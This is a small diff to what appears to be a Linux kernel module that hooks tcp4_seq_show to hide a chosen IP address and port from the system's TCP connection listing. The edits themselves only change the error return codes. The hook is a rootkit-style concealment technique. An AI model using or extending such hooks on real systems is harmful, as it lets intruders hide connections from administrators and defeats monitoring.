@@ -44,13 +44,13 @@ int load(void) {
     pr_info("Initializing...");
     if (port_to_hide == -1) {
         pr_warn("port to hide has not been set! Exiting...");
-        return -1;
+        return -EINVAL;
     }
     pr_info("%s:%d", ip_to_hide, port_to_hide);
 
     int res = setup_kernel_func_hook(&hook, "tcp4_seq_show", (unsigned long)new_tcp4_seq_show);
     if (res) {
-        return -1;
+        return res;
     }
 
     pr_info("Initialized successfuly!");
